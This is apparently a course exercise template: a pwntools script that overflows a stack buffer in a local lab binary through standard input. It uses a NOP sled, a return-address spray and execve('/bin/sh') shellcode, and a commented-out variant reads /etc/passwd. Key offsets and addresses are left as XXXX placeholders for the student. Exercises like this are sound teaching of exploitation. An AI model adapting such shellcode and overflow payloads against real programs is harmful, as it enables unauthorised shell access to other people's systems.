#!/usr/bin/python3 
from pwn import *

# Exericse 5. This task is similar to Exercise 3, but instead of creating a badfile,
# we will attempt to overflow the buffer through standard input. This is meant
# to show you how to use pwntools to program a two-way interaction with a process
# without user input. 

def shellcode():
  context.arch = 'amd64'
  # sc = shellcraft.execve("/bin/cat", argv=["/bin/cat", "/etc/passwd"], envp=[])
  sc = shellcraft.execve("/bin/sh")
  return asm(sc)

def create_payload(): 
  # payload length; note that the function we are exploiting (process_stdin)
  # uses fgets to copy the input from stdin. fgets adds a null byte at the end
  # of input, so we want to make sure that it does not interfere with our payload.
  # so we craft a payload that is slightly smaller than the blocksize
  bytearraylen = 512-8 

  # This is where the actual payload will be stored
  # Initiallly, fill it with NOPs, to form a NOP sled. 
  content = bytearray(0x90 for i in range(bytearraylen))

  # generate shellcode 
  code = shellcode()
  shellcode_offset = bytearraylen - len(code)
  content[shellcode_offset:] = code 

  # Parameters for the spraying
  
  # TODO: Determine address range [A, A+H] and the parameters S and L for the spraying and NOP sled.

  ret_offset = XXXX
  A = XXXX
  S = ret_offset + 8
  L = shellcode_offset - S 
  H = L-1 

  print("S: %d, L: %d, H: %d, RT offset: %d" % (S,L,H,ret_offset))

  if S <= ret_offset:
    print('The RT spray is too short. Try changing the H parameter.')
    exit()
  if H > L: 
    print('H is greater than L -- the return address may not land on the NOP sled')
    exit()

  # TODO: calculate the address of the shellcode
  shellcode_address = XXXX 

  b=shellcode_address.to_bytes(8, byteorder='little')

  # spray with 8 byte increment
  k=S//8
  for i in range(k):
    content[i*8:(i+1)*8] = b 

  # pad content with NOPs 
  content = content + (b'\x90' * 8)
  return content


def main():
  content = create_payload() 
  p = process(['./hexits', '512'])
  
  # Send a line to the process, containing our payload. 
  p.sendline(content)
  p.interactive()

if __name__ == '__main__':
    main()
